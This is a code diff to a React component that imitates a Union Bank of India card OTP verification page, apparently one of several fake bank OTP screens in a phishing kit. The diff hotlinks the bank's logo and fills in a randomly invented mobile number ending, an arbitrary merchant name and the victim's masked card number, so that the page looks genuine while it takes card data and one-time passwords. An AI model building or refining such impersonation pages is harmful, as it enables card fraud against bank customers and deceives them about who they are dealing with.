@@ -40,6 +40,22 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
   const [otpValue, setOtpValue] = useState('');
   const [timeLeft, setTimeLeft] = useState(179); // 2:59 in seconds
   const [isExpired, setIsExpired] = useState(false);
+  
+  // Random mobile last 4 digits (session-persistent like other OTP pages)
+  const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
+  const [cardLast4] = useState(() => {
+    const cleaned = cardData.cardNumber.replace(/\s/g, '');
+    return cleaned.slice(-4);
+  });
+  
+  // Current date and time (real-time)
+  const [currentDateTime] = useState(() => {
+    const now = new Date();
+    const day = now.getDate().toString().padStart(2, '0');
+    const month = now.toLocaleString('en-US', { month: 'short' });
+    const year = now.getFullYear();
+    return `${day}-${month}-${year}`;
+  });
 
   // Bank and card logos
   const bankLogo = "https://logos-world.net/wp-content/uploads/2021/03/Union-Bank-of-India-Logo.png";
@@ -64,30 +80,12 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
     return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
   };
 
-  // Generate masked mobile number (last 4 digits)
-  const generateMaskedMobile = (): string => {
-    const lastFour = Math.floor(1000 + Math.random() * 9000).toString();
-    return `XXXXXXXX${lastFour.slice(-2)}`;
-  };
-
-  // Format card number (first 6 + XXXXXX + last 4)
-  const formatCardNumber = (cardNumber: string): string => {
-    const cleaned = cardNumber.replace(/\s/g, '');
-    if (cleaned.length >= 10) {
-      const first6 = cleaned.substring(0, 6);
-      const last4 = cleaned.substring(cleaned.length - 4);
-      return `${first6}XXXXXX${last4}`;
-    }
-    return cardNumber;
-  };
-
-  // Get current date
-  const getCurrentDate = (): string => {
-    const now = new Date();
-    const day = now.getDate().toString().padStart(2, '0');
-    const month = now.toLocaleString('en-US', { month: 'short' });
-    const year = now.getFullYear();
-    return `${day}-${month}-${year}`;
+  // Format card number (first 4 + XXXXXX + last 4) like other OTP pages
+  const formatCardNumber = (): string => {
+    const cleaned = cardData.cardNumber.replace(/\s/g, '');
+    const first4 = cleaned.slice(0, 4);
+    const last4 = cleaned.slice(-4);
+    return `${first4}XXXXXX${last4}`;
   };
 
   const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -182,28 +180,28 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
         <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
           <div className="w-20 text-right">Mobile Number</div>
           <div className="w-4 text-center">:</div>
-          <div className="flex-1 text-left">{generateMaskedMobile()}</div>
+          <div className="flex-1 text-left">XXXXXX{mobileLast4}</div>
         </div>
 
         {/* Merchant Name */}
         <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
           <div className="w-20 text-right">Merchant Name</div>
           <div className="w-4 text-center">:</div>
-          <div className="flex-1 text-left">BOOKMYSHOW</div>
+          <div className="flex-1 text-left">PLURALSIGHT</div>
         </div>
 
         {/* Date */}
         <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
           <div className="w-20 text-right">Date</div>
           <div className="w-4 text-center">:</div>
-          <div className="flex-1 text-left">{getCurrentDate()}</div>
+          <div className="flex-1 text-left">{currentDateTime}</div>
         </div>
 
         {/* Card Number */}
         <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
           <div className="w-20 text-right">Card Number</div>
           <div className="w-4 text-center">:</div>
-          <div className="flex-1 text-left">{formatCardNumber(cardData.cardNumber)}</div>
+          <div className="flex-1 text-left">{formatCardNumber()}</div>
         </div>
 
         {/* Amount */}
